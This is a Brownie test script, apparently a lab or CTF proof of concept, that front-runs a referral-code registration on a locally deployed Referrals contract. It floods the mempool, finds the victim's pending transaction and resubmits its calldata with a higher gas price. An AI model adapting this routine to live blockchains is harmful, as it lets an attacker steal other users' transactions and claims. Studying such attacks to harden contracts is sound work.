from web3 import Web3
from brownie import accounts, Referrals, chain
#import contextlib
#import io

#@pytest.fixture
def test_frontrunning():
    yellow ='\x1b[0;33m'
    green ='\x1b[0;32m'
    red='\x1b[0;31m'
    nocolor='\x1b[0;m'
    print(red,"\r[ * ]\x1b[0;33m 0xm4ud FRONT RUNNER 3000",nocolor)
    

    [deployer, user ,attacker] = accounts[:3]
    w3 = Web3(Web3.HTTPProvider())
    #2.5 ETH (ETH -> WEI -> Hexdecimal)
    # the evm_setAccountBalance json-rcp call equivalent in hardhat is hardhat_setBalance

    #Deploy Referrals
    referrals = Referrals.deploy({'from': deployer})
    
    print(red,"\r[ + ]\x1b[0;m Adding noise to the Meempool: 100 transactions incomming.",nocolor)
    #Prepare the transactions to fill up the mempool
    #with contextlib.redirect_stdout(io.StringIO()):
    for _ in range(0,100):
        deployer.transfer(
                accounts.add().address,
                    0.1, 
                    required_confs=0
                    )

    # Issuing refferals for user
    referralCode = Web3.keccak(text=user.address)
    #w3.provider.make_request("miner_stop", [])
    referrals.createReferralCode(referralCode, {'from': user,'required_confs':0})

    #Get pending transactions from MemPool
    def get_pending_transactions(w3):
        ptx = w3.provider.make_request("txpool_content", [])
        ptx_from = ptx['result']['pending']
        return ptx_from

    def find_transaction_by_address(ptx_from, target_address):
        for sender, txs in ptx_from.items():
            for nonce, tx in txs.items():
                if tx['to'].lower() == target_address.lower():
                    return tx
        return None

    w3 = Web3(Web3.HTTPProvider())  # Replace with your own provider URL
    # Replace with the actual address you're looking for
    find_me_address = referrals.address  # <-- Change this
    print("\x1b[0;32m[ * ]\x1b[0;m Searching for TX...")
    while True:
        print("\x1b[0;32m[ + ]\x1b[0;m First Attempt!")
        ptx_from = get_pending_transactions(w3)
        tx = find_transaction_by_address(ptx_from, find_me_address)

        if tx:
            print("\x1b[0;32m[ + ]\x1b[0;m Found it:", tx['to'])
            break
        else:
            print("Not yet")


    print("\x1b[0;32m[ * ]\x1b[0;m Got TX, \x1b[0;32m$$\x1b[0;m Bling Bling\x1b[0;32m $$\x1b[0;m time!!")
    attacker.transfer(to=tx['to'], 
                      data=tx['input'], 
                      gas_price=int(tx['gasPrice'],16)+1, 
                      gas_limit=tx['gas'],
                      required_confs=0
                      )

    print("\x1b[0;32m[ * ]\x1b[0;m Mining block...")
    w3.provider.make_request("evm_mine", [])
    #attackerBalance = attacker.balance()
    assert(referrals.getReferral(referralCode) == attacker.address)
    print("\x1b[0;32m[ + ]\x1b[0;m Front Running Successful!")